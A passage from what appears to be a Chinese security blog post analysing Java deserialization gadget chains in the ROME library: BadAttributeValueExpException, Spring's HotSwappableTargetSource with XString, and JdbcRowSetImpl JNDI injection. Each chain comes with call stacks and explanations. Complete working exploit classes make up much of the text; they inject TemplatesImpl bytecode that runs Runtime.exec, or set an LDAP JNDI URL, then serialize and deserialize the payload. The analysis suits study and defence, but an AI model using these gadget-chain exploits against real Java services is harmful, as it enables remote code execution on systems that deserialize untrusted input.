<span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231124144515.png"><br>这里的key为ObjectBean对象，这样就调用了ObjectBean的hashCode方法，接下来的链与上一个链一致</p>
<h1 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h1><h2 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">BadAttributeValueExpException.readObject()</span><br></pre></td></tr></table></figure>

<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RomeSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttrExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TemplatesImpl对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templateImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ToStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templateImpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建BadAttributeValueExpException对象</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFiled(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;BadAttrExp.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;BadAttrExp.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数调用栈-2"><a href="#函数调用栈-2" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, cccc</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">48</span>, BadAttrExp (RomeSec)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h2><p>查看BadAttributeValueExpException的readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 使用 ObjectInputStream 的 readFields 方法获取反序列化的字段</span></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="comment">// 从字段集合中获取名为 &quot;val&quot; 的字段的值</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        <span class="comment">// 重点在这里，调用了toString方法</span></span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码用于反序列化对象中的字段，并根据字段的类型和值进行处理，而且这里调用了toString方法，符合利用链的要求<br>所以只需要将valObj设置为ToStringBean对象即可，根据下面这句代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>只需要在构造BadAttributeValueExpException对象的时候，将其val参数设置成ToStringBean对象即可<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231124161508.png"></p>
<p><strong>注</strong>：这里进入对应的分支是System.getSecurityManager()返回的null，表示当前线程并未设置或安装安全管理器</p>
<h1 id="HotSwappableTargetSource利用链"><a href="#HotSwappableTargetSource利用链" class="headerlink" title="HotSwappableTargetSource利用链"></a>HotSwappableTargetSource利用链</h1><h2 id="环境依赖-1"><a href="#环境依赖-1" class="headerlink" title="环境依赖"></a>环境依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString</span><br><span class="line">XString.equals()</span><br><span class="line">HotSwappableTargetSource.equals()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.readObject()</span><br></pre></td></tr></table></figure>

<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RomeSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HotSwapExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TemplatesImpl对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templateImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HotSwappableTargetSource</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templateImpl);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">targetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(targetSource1, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        hashMap.put(targetSource2, <span class="string">&quot;222&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;HotSwap.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;HotSwap.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="函数调用栈-3"><a href="#函数调用栈-3" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">104</span>, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1397</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">60</span>, HotSwapExp (RomeSec)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析-3"><a href="#详细分析-3" class="headerlink" title="详细分析"></a>详细分析</h2><p>这条链的前后不变，中间加入了HotSwappableTargetSource和XString</p>
<p>从HashMap开始，在exp中put了2对键值，在读取完第一套键值后，读取第二套键值时在putVal函数出会触发<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231125141557.png"></p>
<p>在putVal函数中会对键作比较，此时传入的参数key就是第二次put进入的key，它会与前面已经存放进入HashMap的key逐个作比较<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231125141916.png"></p>
<p>接下来就借助了HotSwappableTargetSource类中的equals方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object other)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span> == other || other <span class="keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这里可以得到put进入map的两个key都必须为HotSwappableTargetSource对象，第二个是为了能够调用HotSwappableTargetSource的equals方法，另一个是当成参数传递，但由于代码中对传入的参数进行强制的类型转换，所以传入的other也必须要是HotSwappableTargetSource对象</p>
<p>简单而言，这个函数里面的this对应上一个方法的key，即put的第二个key；这里的other对应上一个方法的k，即put的第一个key<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231125142538.png"></p>
<p>在equals方法中，会调用target的equals方法，所以这里的target需要设置XString对象<br>因为XString对象中存在equals方法，并且需要一个参数，而且还调用了该参数的toString方法<br>因此可以得知第二个HotSwappableTargetSource对象的target参数设置成XString对象，而第二个HotSwappableTargetSource对象的target则设置成ToStringBean对象，这样就能够调用XString类的equals方法进而触发ToStringBean的toString方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj2)</span></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> == obj2)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// In order to handle the &#x27;all&#x27; semantics of</span></span><br><span class="line">      <span class="comment">// nodeset comparisons, we always call the</span></span><br><span class="line">      <span class="comment">// nodeset function.</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNodeSet)</span><br><span class="line">      <span class="keyword">return</span> obj2.equals(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(obj2 <span class="keyword">instanceof</span> XNumber)</span><br><span class="line">        <span class="keyword">return</span> obj2.equals(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> str().equals(obj2.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231125143235.png"></p>
<p>然后来到了ToStringBean类的toString方法，获取_beanClass的所有get方法并调用，和前面的链一致</p>
<h1 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h1><h2 id="利用链-4"><a href="#利用链-4" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JdbcRowSetImpl.connect()</span><br><span class="line">JdbcRowSetImpl.getDatabaseMetaData()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">ObjetBean.hashCode()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>

<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RomeSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.rowset.BaseRowSet;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// ldap url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/nils4f&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建JdbcRowSetImpl对象</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dataSource</span> <span class="operator">=</span> BaseRowSet.class.getDeclaredField(<span class="string">&quot;dataSource&quot;</span>);</span><br><span class="line">        dataSource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dataSource.set(jdbcRowSet, url);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ToStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">        <span class="comment">// 创建ObjectBean</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JdbcRowExp.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JdbcRowExp.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

